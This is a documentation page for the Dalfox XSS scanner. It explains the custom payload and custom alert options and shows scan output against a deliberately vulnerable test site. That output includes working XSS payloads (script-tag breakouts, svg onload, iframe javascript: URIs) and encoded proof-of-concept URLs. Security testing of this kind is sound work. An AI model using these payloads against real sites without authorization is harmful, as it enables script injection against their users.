---
title: Custom payload and Custom alert
permalink: /docs/custom-payload/
---

## Custom payload
```
▶ dalfox url --custom-payload payload-list.txt
```

## Custom alert 
### Options
* `--custom-alert-value` = e.g (`XSS` / `1` / `document.location` )
* `--custom-alert-type`= e.g (`str` / `none`)

none or empty: write only alert-value (e.g --custom-alert-value=130 / --custom-alert-value=location.href)
str: `"PAYLOAD"` / `'PAYLOAD'`

### Case of study
default (no option)
```
▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123
...snip...
[V] Triggered XSS Payload (found DOM Object): cat=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
    48 line:  yntax to use near '=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
```

used options - only value
```
▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337
...snip...
[V] Triggered XSS Payload (found DOM Object): cat='><sVg/onload=alert(1337) class=dalfox>
    48 line:  syntax to use near ''><sVg/onload=alert(1337) class=dalfox>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%27%3E%3CsVg%2Fonload%3Dalert%281337%29+class%3Ddalfox%3E
```

used options - with type=str
```
▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str
...snip...
[V] Triggered XSS Payload (found DOM Object): cat=<svG/onload=confirm("1337") class=dalfox>
    48 line:  yntax to use near '=<svG/onload=confirm("1337") class=dalfox>' at line 1
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%3CsvG%2Fonload%3Dconfirm%28%221337%22%29+class%3Ddalfox%3E
```

used options - with type=none,str
```
▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str,int
...snip...
[V] Triggered XSS Payload (found DOM Object): cat="><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE>
    48 line:  syntax to use near '"><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&cat=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%28%271337%27%29+class%3Ddalfox%3E%3C%2FiFramE%3E
```
